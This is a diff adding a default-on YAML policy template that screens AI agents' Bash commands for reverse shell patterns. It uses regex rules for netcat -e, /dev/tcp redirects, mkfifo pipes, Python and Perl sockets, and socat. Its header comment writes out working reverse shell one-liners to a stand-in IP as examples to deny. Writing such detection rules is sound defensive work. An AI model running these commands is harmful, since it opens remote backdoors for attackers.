@@ -1,0 +1,74 @@
+# Source: Security hardening — reverse shell detection
+# Gate: G5 (security tests)
+# Default: ENABLED — shipped as default-on in the built-in bundle
+#
+# Behavior:
+#   nc -e /bin/sh 10.0.0.1 4444                → DENY (netcat reverse shell)
+#   bash -i >& /dev/tcp/10.0.0.1/4444 0>&1     → DENY (bash TCP redirect)
+#   mkfifo /tmp/f; cat /tmp/f | sh | nc ...    → DENY (fifo pipe shell)
+#   python -c 'import socket; s.connect(...)'  → DENY (Python socket shell)
+#   exec 5<>/dev/tcp/host/port                 → DENY (bash fd redirect)
+#   nc localhost 8080                          → ALLOW (normal netcat usage)
+#   curl http://api.example.com                → ALLOW (normal HTTP)
+#
+# Rationale:
+#   Reverse shells allow remote attackers to gain interactive access to
+#   systems. AI agents should never create network backdoors.
+
+apiVersion: aegis.io/v1
+kind: PolicyTemplate
+metadata:
+  name: block-network-reverse-shell
+  annotations:
+    aegis.io/default-enabled: "true"
+    aegis.io/bundle: builtin
+spec:
+  description: "Block reverse shell patterns: netcat -e, bash TCP redirects, and socket connections"
+  matchConstraints:
+    tools: ["Bash"]
+  variables:
+    - name: isNetcatExec
+      # nc -e, nc -c, ncat -e (execute on connect)
+      expression: >-
+        request.args.command.matches("(?i)\\bn(c|cat)\\b.*\\s-[ec]\\s")
+    - name: isBashTcpRedirect
+      # /dev/tcp/ or /dev/udp/ patterns (bash special files)
+      expression: >-
+        request.args.command.matches("/dev/(tcp|udp)/")
+    - name: isFifoPipeShell
+      # mkfifo combined with shell piping (common reverse shell pattern)
+      expression: >-
+        request.args.command.matches("(?i)\\bmkfifo\\b") &&
+        request.args.command.matches("(?i)\\b(sh|bash|nc|ncat)\\b")
+    - name: isPythonSocketShell
+      # Python socket with connect (reverse shell pattern)
+      expression: >-
+        request.args.command.matches("(?i)\\bpython[23]?\\b.*socket.*connect")
+    - name: isPerlSocketShell
+      # Perl socket reverse shell
+      expression: >-
+        request.args.command.matches("(?i)\\bperl\\b.*socket.*connect")
+    - name: isSocat
+      # socat to shell (exec:, system:, pty)
+      expression: >-
+        request.args.command.matches("(?i)\\bsocat\\b.*(exec:|system:|pty)")
+  validations:
+    - expression: 'isNetcatExec'
+      message: 'Netcat with execute flag (-e/-c) is blocked — this creates a reverse shell'
+      action: DENY
+    - expression: 'isBashTcpRedirect'
+      message: '/dev/tcp or /dev/udp redirection is blocked — this creates network backdoors'
+      action: DENY
+    - expression: 'isFifoPipeShell'
+      message: 'FIFO pipe to shell pattern is blocked — this is a common reverse shell technique'
+      action: DENY
+    - expression: 'isPythonSocketShell'
+      message: 'Python socket connect pattern is blocked — potential reverse shell'
+      action: DENY
+    - expression: 'isPerlSocketShell'
+      message: 'Perl socket connect pattern is blocked — potential reverse shell'
+      action: DENY
+    - expression: 'isSocat'
+      message: 'Socat to shell is blocked — this creates interactive backdoors'
+      action: DENY
+  defaultAction: ALLOW
